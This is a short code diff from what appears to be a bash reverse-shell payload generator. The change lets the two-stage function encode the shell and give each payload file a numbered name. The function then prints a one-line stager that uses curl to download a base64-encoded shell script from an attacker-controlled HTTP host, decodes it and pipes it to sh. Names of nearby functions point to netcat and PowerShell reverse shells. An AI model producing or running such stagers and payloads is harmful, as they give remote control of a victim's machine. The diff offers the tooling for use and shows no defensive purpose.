@@ -388,11 +388,17 @@ get_windows_binaries_powershell() {
 get_twostage_reverse_shell() {
     if [[ -z $cmd ]]; then
         cmd=$(get_bash_reverse_shell)
+        cmd=$(encode_bash_payload "$cmd")
     fi
+    local shell_name="reverse_shell"
+    if [[ ! -z $shell_number ]]; then
+        shell_name+="_$shell_number"
+    fi
+    shell_name+=".b64"
     echo '#!/bin/bash' > reverse_shell.sh
     echo "$cmd" >> reverse_shell.sh
-    base64 -w0 reverse_shell.sh > reverse_shell.b64
-    echo "curl http://$http_ip:$http_port/reverse_shell.b64 | base64 -d | sh"
+    base64 -w0 reverse_shell.sh > "$shell_name"
+    echo "curl http://$http_ip:$http_port/$shell_name | base64 -d | sh"
 }
 
 get_nc_reverse_shell_powershell() {
